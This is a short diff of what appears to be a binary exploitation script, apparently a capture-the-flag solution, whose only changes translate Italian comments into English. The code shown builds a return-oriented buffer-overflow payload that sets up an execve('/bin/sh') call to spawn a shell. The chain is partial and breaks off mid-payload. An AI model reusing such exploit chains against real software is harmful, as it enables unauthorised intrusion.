@@ -21,12 +21,12 @@ payload = b"A" * offset
 
 # RAX = 0, 0 ^ 59 = 59 (execve)
 payload += p64(pop_rdi)
-payload += p64(59)           # Carichiamo 59 in RDI
-payload += p64(xor_rax_rdi)  # Eseguiamo lo XOR -> RAX diventa 59
+payload += p64(59)           # Setting 59 in RDI
+payload += p64(xor_rax_rdi)  # Execute XOR -> RAX = 59
 
 # Config for execve("/bin/sh", 0, 0)
 payload += p64(pop_rdi)
-payload += p64(bss_addr)     # RDI = puntatore a "/bin/sh"
+payload += p64(bss_addr)     # RDI = *"/bin/sh"
 payload += p64(pop_rsi)
 payload += p64(0)            # RSI = 0
 payload += p64(pop_rdx)
